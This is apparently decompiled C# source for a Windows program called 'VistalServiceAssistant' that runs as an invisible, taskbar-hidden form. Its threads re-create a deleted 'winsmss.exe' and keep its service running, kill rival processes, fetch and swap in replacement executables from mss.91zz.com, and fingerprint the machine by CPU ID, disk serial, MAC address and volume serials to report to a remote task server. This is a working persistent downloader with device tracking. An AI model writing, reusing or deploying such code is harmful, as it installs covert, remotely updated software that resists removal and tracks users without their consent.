using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using InstallService;

namespace VistalServiceAssistant;

public class Form1 : Form
{
	private string string_0 = "5";

	private string string_1 = "";

	private string string_2 = "winsmss";

	private string string_3 = "";

	private string string_4 = "http://mss.91zz.com/getupdatewinsmss.aspx?md5=";

	private string string_5 = "http://mss.91zz.com/winsmss.exe";

	private string string_6 = "";

	private bool bool_0 = true;

	private byte[] byte_0;

	private Thread thread_0;

	private GClass0.GStruct0 gstruct0_0;

	private string string_7 = GClass2.string_3;

	private IContainer icontainer_0;

	[DllImport("kernel32.dll")]
	private static extern int GetVolumeInformation(string lpRootPathName, string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, int lpMaximumComponentLength, int lpFileSystemFlags, string lpFileSystemNameBuffer, int nFileSystemNameSize);

	[DllImport("Iphlpapi.dll")]
	private static extern int SendARP(int dest, int host, ref long mac, ref int length);

	[DllImport("Ws2_32.dll")]
	private static extern int inet_addr(string ip);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string_1 = AppDomain.CurrentDomain.BaseDirectory;
		bool_0 = true;
		string_6 = string_1 + "\\" + string_2 + ".exe";
		ThreadStart start = method_0;
		thread_0 = new Thread(start);
		thread_0.Start();
		ThreadStart start2 = method_1;
		Thread thread = new Thread(start2);
		thread.Start();
		ThreadStart start3 = method_2;
		Thread thread2 = new Thread(start3);
		thread2.Start();
	}

	private void method_0()
	{
		while (true)
		{
			try
			{
				if (bool_0 && File.Exists(string_6))
				{
					FileStream fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read);
					byte_0 = new byte[fileStream.Length];
					fileStream.Read(byte_0, 0, (int)fileStream.Length);
					fileStream.Close();
					bool_0 = false;
				}
			}
			catch (Exception)
			{
			}
			while (true)
			{
				try
				{
					if (!File.Exists(string_6) && byte_0 != null)
					{
						FileStream fileStream2 = File.Create(string_6);
						fileStream2.Write(byte_0, 0, byte_0.Length);
						fileStream2.Close();
					}
				}
				catch (Exception)
				{
					Thread.Sleep(500);
					continue;
				}
				break;
			}
			if (File.Exists(string_6))
			{
				try
				{
					if (GClass0.smethod_3(string_7) != 2)
					{
						GClass0.smethod_2(string_7);
					}
					if (!GClass0.smethod_5(string_7))
					{
						GClass0.smethod_6(string_7);
					}
				}
				catch (Exception)
				{
					string text = "";
					string text2 = "";
					if (!GClass0.smethod_8(ref text, ref text2))
					{
						Process[] processes = Process.GetProcesses();
						for (int i = 0; i < processes.Length; i++)
						{
							if (processes[i].ProcessName.ToLower().Trim() == GClass2.string_1)
							{
								processes[i].Kill();
							}
						}
						GClass1 gClass = new GClass1();
						try
						{
							if (gClass.method_0(string_6, text, text2))
							{
								string_7 = text;
							}
						}
						catch (Exception)
						{
						}
					}
					else
					{
						string_7 = text;
					}
				}
				Thread.Sleep(500);
			}
			else
			{
				Thread.Sleep(1000);
			}
		}
	}

	private void method_1()
	{
		int num = 5;
		while (true)
		{
			if (!File.Exists(string_6) && byte_0 == null)
			{
				method_3();
			}
			if (!File.Exists(string_6) && byte_0 == null)
			{
				Thread.Sleep(500);
				continue;
			}
			DateTime now = DateTime.Now;
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				FileStream fileStream = new FileStream(string_6, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
				mD5CryptoServiceProvider.ComputeHash(fileStream);
				byte[] hash = mD5CryptoServiceProvider.Hash;
				StringBuilder stringBuilder = new StringBuilder();
				byte[] array = hash;
				foreach (byte b in array)
				{
					stringBuilder.Append($"{b:X1}");
				}
				fileStream.Close();
				string text = stringBuilder.ToString();
				WebClient webClient = new WebClient();
				string text2 = webClient.DownloadString(string_4 + text);
				if (text2 != null && text2.Trim() != "")
				{
					string[] array2 = text2.Split(new char[1] { '|' });
					if (array2.Length >= 3)
					{
						if (array2[1] == "0")
						{
							break;
						}
						num = int.Parse(array2[2]);
						if (array2[0] == "T")
						{
							string text3 = string_1 + "\\temp" + string_2 + ".exe";
							if (File.Exists(text3))
							{
								File.Delete(text3);
							}
							webClient.DownloadFile(string_5, text3);
							if (File.Exists(text3))
							{
								MD5CryptoServiceProvider mD5CryptoServiceProvider2 = new MD5CryptoServiceProvider();
								FileStream fileStream2 = new FileStream(text3, FileMode.Open, FileAccess.Read, FileShare.Read, 8192);
								mD5CryptoServiceProvider2.ComputeHash(fileStream2);
								byte[] hash2 = mD5CryptoServiceProvider2.Hash;
								StringBuilder stringBuilder2 = new StringBuilder();
								byte[] array3 = hash2;
								foreach (byte b2 in array3)
								{
									stringBuilder2.Append($"{b2:X1}");
								}
								fileStream2.Close();
								if (array2[3] == stringBuilder2.ToString())
								{
									thread_0.Suspend();
									while (thread_0.ThreadState != System.Threading.ThreadState.Suspended)
									{
										try
										{
											thread_0.Suspend();
										}
										catch
										{
										}
										Thread.Sleep(500);
									}
									if (File.Exists(string_6))
									{
										string text4 = string_1 + "\\wtempfile.exe";
										if (File.Exists(text4))
										{
											File.Delete(text4);
										}
										File.Move(string_6, text4);
										File.Move(text3, string_6);
									}
									else
									{
										File.Move(text3, string_6);
									}
									Process[] processes = Process.GetProcesses();
									for (int k = 0; k < processes.Length; k++)
									{
										if (processes[k].ProcessName.ToLower().Trim() == string_2)
										{
											processes[k].Kill();
										}
									}
									bool_0 = true;
									thread_0.Resume();
								}
							}
						}
					}
				}
			}
			catch (Exception)
			{
				try
				{
					if (thread_0.ThreadState != 0)
					{
						thread_0.Resume();
					}
				}
				catch
				{
				}
			}
			while (DateTime.Now <= now.AddMinutes(num))
			{
				Thread.Sleep(60000);
			}
		}
	}

	private void method_2()
	{
		int num = 5;
		method_5();
		string text = "http://mss.91zz.com/taskget.aspx?guid=";
		while (true)
		{
			DateTime now = DateTime.Now;
			try
			{
				WebClient webClient = new WebClient();
				string text2 = webClient.DownloadString(text + string_3 + "&version=" + string_0);
				if (text2 != null && text2.Trim() != "")
				{
					string[] array = text2.Split(new char[1] { '|' });
					if (array.Length == 2)
					{
						if (array[0] == "0")
						{
							break;
						}
						num = int.Parse(array[1]);
					}
				}
				webClient?.Dispose();
			}
			catch (Exception)
			{
			}
			while (DateTime.Now <= now.AddMinutes(num))
			{
				Thread.Sleep(60000);
			}
		}
	}

	private void method_3()
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(string_5, string_6);
		}
		catch
		{
		}
	}

	private void method_4(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	private void method_5()
	{
		string text = "null";
		try
		{
			text = method_6() + method_7();
			text = text.Replace("0", "").Replace(" ", "");
			if (text == "")
			{
				string text2 = method_8("localhost").ToString().Trim();
				if (text2 == "0")
				{
					text2 = method_11();
					if (text2.Trim() == "")
					{
						text2 = "null";
					}
				}
				text = text2;
			}
		}
		catch
		{
		}
		string_3 = text;
	}

	private string method_6()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
			string result = null;
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val = (ManagementObject)enumerator.get_Current();
					result = ((ManagementBaseObject)val).get_Properties().get_Item("ProcessorId").get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch
		{
			return "";
		}
	}

	private string method_7()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
			string result = null;
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (((ManagementBaseObject)val2).get_Item("SerialNumber") != null)
					{
						result = ((ManagementBaseObject)val2).get_Item("SerialNumber").ToString()!.Trim();
					}
					else
					{
						ManagementObjectSearcher val3 = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
						ManagementObjectEnumerator enumerator2 = val3.Get().GetEnumerator();
						try
						{
							if (enumerator2.MoveNext())
							{
								ManagementObject val4 = (ManagementObject)enumerator2.get_Current();
								result = ((ManagementBaseObject)val4).get_Item("Model").ToString();
							}
						}
						finally
						{
							((IDisposable)enumerator2)?.Dispose();
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception)
		{
			return "";
		}
	}

	private long method_8(string string_8)
	{
		int dest = inet_addr(string_8);
		try
		{
			long mac = 0L;
			int length = 6;
			SendARP(dest, 0, ref mac, ref length);
			return mac;
		}
		catch (Exception)
		{
			return 0L;
		}
	}

	private long method_9(long long_0)
	{
		int dest = (int)long_0;
		try
		{
			long mac = 0L;
			int length = 6;
			SendARP(dest, 0, ref mac, ref length);
			return mac;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error:{0}", ex.Message);
		}
		return 0L;
	}

	public string method_10(string string_8)
	{
		try
		{
			int lpVolumeSerialNumber = 0;
			string lpVolumeNameBuffer = null;
			string lpFileSystemNameBuffer = null;
			GetVolumeInformation(string_8 + ":\\", lpVolumeNameBuffer, 256, ref lpVolumeSerialNumber, 0, 0, lpFileSystemNameBuffer, 256);
			return lpVolumeSerialNumber.ToString("x");
		}
		catch
		{
			return "";
		}
	}

	private string method_11()
	{
		string text = "";
		try
		{
			text += method_10("C");
		}
		catch
		{
		}
		try
		{
			text += method_10("D");
		}
		catch
		{
		}
		try
		{
			text += method_10("E");
		}
		catch
		{
		}
		try
		{
			text += method_10("F");
			return text;
		}
		catch
		{
			return text;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(108, 0));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
